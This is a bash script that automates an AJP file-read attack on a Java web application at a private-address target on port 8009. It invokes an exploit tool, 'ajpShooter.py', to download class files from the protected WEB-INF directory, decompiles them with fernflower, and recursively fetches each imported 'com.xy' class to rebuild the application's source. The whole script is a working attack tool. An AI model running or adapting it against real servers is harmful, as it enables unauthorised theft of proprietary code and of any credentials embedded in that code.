TARGET="http://192.168.0.66/SistemaZ"
PORT=8009

if [ $# -lt 1 ]; then
  echo "Usage: $0 class-path"
  exit 1
fi

RED="\e[31m"
RESET="\e[0m"

yell() { echo "${RED}ERROR:${RESET} $*" >&2; }
die() { yell "$*"; exit 111; }
try() { "$@" || die "cannot $*"; }

SELF="$0"
CLASS_NAME="$1"

REMOTE_CLASS_PATH="/WEB-INF/classes/$(echo "$CLASS_NAME" | tr '.' '/').class"
LOCAL_CLASS_PATH="classes/$CLASS_NAME.class"

if [ -f "$LOCAL_CLASS_PATH" ]; then
  echo "already fetched $LOCAL_CLASS_PATH"
  exit 0
fi

echo "fetching: $REMOTE_CLASS_PATH"

LOCAL_CLASS_PATH="classes/$CLASS_NAME.class"
LOCAL_JAVA_PATH="javas/$CLASS_NAME.java"

mkdir -p classes

python3 ajpShooter.py "$TARGET" "$PORT" "$REMOTE_CLASS_PATH" read -o "$LOCAL_CLASS_PATH" > tmp

grep -q "404 Not Found" tmp && {
  yell "could not fetch $CLASS_NAME"
  $SELF "${CLASS_NAME%.*}"
  exit
}

java -jar fernflower.jar "$LOCAL_CLASS_PATH" javas/ > tmp || {
  yell "failed to decompile $CLASS_NAME"
  exit 1
}

grep "import com.xy" "$LOCAL_JAVA_PATH" | sed 's/import //' | sed 's/;//' | \
while read -r import; do
  $SELF "$import"
done
